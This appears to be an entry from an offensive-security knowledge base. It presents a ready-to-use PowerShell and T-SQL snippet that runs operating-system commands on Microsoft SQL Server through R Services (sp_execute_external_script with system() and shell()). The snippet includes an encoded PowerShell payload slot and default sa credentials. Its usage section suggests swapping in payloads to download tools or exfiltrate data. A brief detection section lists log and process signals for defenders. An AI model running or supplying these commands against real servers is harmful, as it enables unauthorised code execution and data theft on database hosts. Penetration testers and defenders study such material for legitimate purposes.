---
id: 238a6774-dabb-4fde-b5d5-53f3b63e9537
name: MSSQL-R-Command-Execution-Script
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:20.629279+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - mssql
  - rce
  - script
validated: true
---

# MSSQL-R-Command-Execution-Script

## Code

```ps1
Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose

EXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir",intern=T))'
WITH RESULT SETS (([cmd_out] text));
GO

@script=N'OutputDataSet <-data.frame(shell("dir",intern=T))'
```

## Description

This code snippet combines a PowerShell invocation for initial OS command execution on MSSQL and SQL-based R scripts using sp_execute_external_script to run OS commands via R's system() and shell() functions. It demonstrates RCE by capturing command output (e.g., dir listing) as a data frame returned to SQL, useful for post-exploitation in database environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| sa | SQL admin username | sa |
| Password1234 | SQL password | Password1234 |
| <DBSERVERNAME\DBInstance> | Target MSSQL instance | SERVER\SQLEXPRESS |
| <base64encodedscript> | Base64-encoded PowerShell payload | JAB... (e.g., encoded 'whoami') |
| cmd.exe /c dir | OS command in system() | cmd.exe /c whoami |
| dir | OS command in shell() | whoami |

## Usage

Execute the PowerShell part first for credentialed command injection, then run the SQL parts in an MSSQL client like SSMS. Modify the embedded commands for custom payloads, such as downloading tools or exfiltrating data. This is typically used after gaining SQL access in a penetration test or red team engagement targeting MSSQL with R Services.

## Detection

- SQL audit logs showing sp_execute_external_script calls with @language='R' and suspicious @script content (e.g., system() or shell() invocations).
- MSSQL error logs recording external script execution and OS command outputs.
- Host-level monitoring for processes spawned by the MSSQL service account (e.g., cmd.exe from sqlservr.exe).
- Network anomalies if commands involve downloads or connections.

## Related

- [[procedures/MSSQL-Server-R-Command-Execution]]
- [[commands/invoke-sqloscmdr-execute]]
